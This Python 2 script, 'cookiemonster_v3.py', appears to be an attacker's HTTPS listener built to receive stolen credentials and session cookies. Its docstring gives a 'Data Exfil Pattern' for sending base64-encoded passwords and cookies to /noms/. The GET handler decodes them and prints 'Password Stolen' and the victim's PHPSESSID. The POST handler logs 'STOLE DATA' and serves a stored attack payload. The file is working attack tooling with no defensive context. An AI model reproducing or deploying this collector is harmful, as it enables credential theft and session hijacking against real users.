#!/usr/bin/env python
"""
Very simple HTTPS server in python.

Usage::
    python cookiemonster_v3.py [<port>]

Data Exfil Pattern:

    Send Get Request to /noms/<base64_password>/<base64_cookies>

Generate Server Cert:

    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes



"""
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import ssl
import urlparse
import base64
import binascii

class S(BaseHTTPRequestHandler):
    
    def parse_cookies(self, base64_cookies):
	raw_cookies = base64.b64decode(base64_cookies)
	split_cookies = raw_cookies.split('; ')
	cookies = {}
	for cookie in split_cookies:
	    cookie_map = cookie.split('=')
            cookies[cookie_map[0]]=cookie_map[1]
	#print cookies
	return cookies

    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        #cookies = self.headers['Cookie']
        parsed_path = urlparse.urlparse(self.path)
        #print '\nPath: %s\n' % self.path
        print '\nPassword Stolen:\n\n\t%s\n\n' % base64.b64decode(self.path.split('/')[2])
	print '\nSession Stolen:\n\n%s\n\n' % self.parse_cookies(self.path.split('/')[3])['PHPSESSID']
	self._set_headers()
	self.wfile.write('It Works')


    def do_HEAD(self):
        self._set_headers()
        
    def do_POST(self):
        # Doesn't do anything with posted data
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        #cookies = self.headers['Cookie']
        post_data = self.rfile.read(content_length) # <--- Gets the data itself

        print 'POST RECEIVED\n\n STOLE DATA\n\n %s\n\n' %post_data

        fields = urlparse.parse_qs(post_data)
        print 'Fields:\n%s' % fields

        f = open('noms.html', 'r')
        attack_payload = f.read()
        

	self._set_headers()
        self.wfile.write(attack_payload)
        #self.wfile.write("<html><body><h1>Cookie Monster</h1><br>Stolen Noms (Cookies):<br>"+post_data+"</body></html>")
        
def run(server_class=HTTPServer, handler_class=S, port=1337):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)

    #Add SSL
    httpd.socket = ssl.wrap_socket(httpd.socket, certfile='./server.pem', server_side=True)

    print 'Starting httpd...'
    httpd.serve_forever()

if __name__ == "__main__":
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
